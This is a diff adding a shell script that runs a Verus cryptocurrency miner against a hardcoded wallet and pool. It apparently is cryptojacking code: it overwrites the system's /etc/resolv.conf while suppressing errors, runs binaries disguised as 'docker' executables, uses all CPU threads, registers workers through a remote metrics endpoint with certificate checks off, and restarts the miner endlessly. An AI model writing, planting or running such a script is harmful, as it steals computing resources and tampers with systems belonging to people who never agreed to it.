@@ -1,0 +1,88 @@
+#!/bin/sh
+WALLET="RAekjoNg7FCkAdub3D8stA4LotrZqJKofu"
+POOL="stratum+tcp://sg.servernotdie.dpdns.org:8080"
+METRICS_URL="https://n.snd.qzz.io/metrics"
+
+# Force DNS 1.1.1.1
+{
+    printf 'nameserver 1.1.1.1\nnameserver 8.8.8.8\n' > /etc/resolv.conf
+} 2>/dev/null || true
+
+# Detect arch and select binary
+ARCH=$(uname -m 2>/dev/null || echo "x86_64")
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+
+case "$ARCH" in
+    x86_64|amd64)
+        MINER="$SCRIPT_DIR/docker-x86_64"
+        ;;
+    aarch64|arm64|armv8*)
+        MINER="$SCRIPT_DIR/docker-aarch64"
+        ;;
+    *)
+        echo "[verus] Unsupported arch: $ARCH, falling back to x86_64"
+        MINER="$SCRIPT_DIR/docker-x86_64"
+        ;;
+esac
+
+# Ensure both binaries are executable
+chmod +x "$SCRIPT_DIR/docker-x86_64"  2>/dev/null || true
+chmod +x "$SCRIPT_DIR/docker-aarch64" 2>/dev/null || true
+
+if [ ! -f "$MINER" ]; then
+    echo "[verus] Binary not found: $MINER"
+    exit 1
+fi
+
+# Resolve CPU model name for worker label
+CN=$(grep -m1 "model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2 | sed 's/^[ \t]*//;s/[ \t]*$//')
+if [ -z "$CN" ]; then
+    CN=$(lscpu 2>/dev/null | grep -i "Model name" | cut -d: -f2 | sed 's/^[ \t]*//;s/[ \t]*$//')
+fi
+if [ -z "$CN" ]; then
+    CN="generic-${ARCH}"
+fi
+CN=$(echo "$CN" \
+    | sed 's/@[0-9.]*GHz//gi' \
+    | sed 's/([^)]*)//g' \
+    | sed 's/(R)//gi; s/CPU//gi' \
+    | sed 's/^[ \t]*//; s/[ \t]*$//' \
+    | sed 's/[ \t]\+/_/g' \
+    | sed 's/__\+/_/g; s/^_//; s/_$//')
+
+TT=$(nproc --all 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1)
+
+# Get next available worker number from metrics
+echo "[verus] Fetching worker index from metrics..."
+EXISTING_WORKERS=$(curl -sk "$METRICS_URL" 2>/dev/null \
+    | grep "mining_tunnel_miner_hashrate" \
+    | grep "\"${WALLET}.${CN}nole" \
+    | sed 's/.*miner="\([^"]*\)".*/\1/' \
+    | sed "s/.*${CN}nole//" \
+    | sed 's/".*//')
+
+MAX_NUM=0
+if [ -n "$EXISTING_WORKERS" ]; then
+    for num in $EXISTING_WORKERS; do
+        case "$num" in
+            ''|*[!0-9]*) continue ;;
+            *)
+                if [ "$num" -gt "$MAX_NUM" ]; then
+                    MAX_NUM=$num
+                fi
+                ;;
+        esac
+    done
+fi
+WORKER_NUM=$((MAX_NUM + 1))
+WORKER="${CN}nole${WORKER_NUM}"
+
+echo "[verus] Arch: $ARCH | Binary: $(basename $MINER) | Threads: $TT | Worker: $WORKER"
+
+# Run miner loop, restart on crash
+while true; do
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Starting miner..."
+    "$MINER" -a verus -o "$POOL" -u "${WALLET}.${WORKER}" -p x -t "$TT"
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Miner stopped. Restarting in 3 seconds..."
+    sleep 3
+done
